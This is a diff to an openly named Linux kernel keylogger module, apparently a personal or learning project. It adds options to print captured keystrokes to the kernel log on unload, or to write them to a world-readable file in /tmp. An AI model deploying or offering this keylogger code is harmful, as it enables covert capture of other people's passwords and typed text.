@@ -7,9 +7,14 @@
 #include <linux/ktime.h>
 #include <linux/input.h>
 #include <linux/slab.h>
+#include <linux/err.h>
+#include <linux/kernel.h>
 
 #define IGNORE_REPEAT
 // #define IGNORE_REPEAT_TIMESTAMP
+#define LOG_KERNEL
+// #define LOG_TMP_FILE
+// #define LOG_ONLY_PRESSED
 
 typedef struct {
     const char *name;
@@ -139,6 +144,7 @@ KeyMap key_table[] = {
 
 #define MAX_LOG_ENTRIES 512
 #define MAX_LOG_LEN 128
+#define LOG_FILE_PATH "/tmp/jareste_keylogger.log"
 
 static char log_entries[MAX_LOG_ENTRIES][MAX_LOG_LEN];
 static int log_start = 0;
@@ -285,6 +291,7 @@ static int __init keyboard_init(void)
 
 static void keyboard_exit(void)
 {
+#ifdef LOG_KERNEL
     int i;
 
     pr_info("=== Keyboard Logger: Final Logs ===\n");
@@ -294,15 +301,59 @@ static void keyboard_exit(void)
     for (i = 0; i < log_count; i++)
     {
         int index = (log_start + i) % MAX_LOG_ENTRIES;
+
+#ifdef LOG_ONLY_PRESSED
+        if (strstr(log_entries[index], "Released") != NULL)
+            continue;
+#endif
+
         pr_info("%s", log_entries[index]);
+    }
+    mutex_unlock(&log_lock);
+#endif
+
+#ifdef LOG_TMP_FILE
+    struct file *log_file;
+    int i;
+
+    pr_info("=== Keyboard Logger: Final Logs ===\n");
+
+    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (IS_ERR(log_file))
+    {
+        pr_err("Failed to open %s for writing: error %ld\n", LOG_FILE_PATH, PTR_ERR(log_file));
+        return;
+    }
+
+    mutex_lock(&log_lock);
+
+    for (i = 0; i < log_count; i++)
+    {
+        int index = (log_start + i) % MAX_LOG_ENTRIES;
+
+#ifdef LOG_ONLY_PRESSED
+        if (strstr(log_entries[index], "Released") != NULL)
+            continue;
+#endif
+        const char *current_log = log_entries[index];
+        size_t log_len = strlen(current_log);
+
+        kernel_write(log_file, current_log, log_len, &log_file->f_pos);
     }
 
     mutex_unlock(&log_lock);
 
+    filp_close(log_file, NULL);
+#endif
+
     unregister_keyboard_notifier(&nb);
     misc_deregister(&keyboard_misc_device);
-
+#ifdef LOG_KERNEL
     pr_info("Keyboard logger unloaded successfully.\n");
+#endif
+#ifdef LOG_TMP_FILE
+    pr_info("Keyboard logger unloaded successfully. Logs saved to %s\n", LOG_FILE_PATH);
+#endif
 }
 
 module_init(keyboard_init);
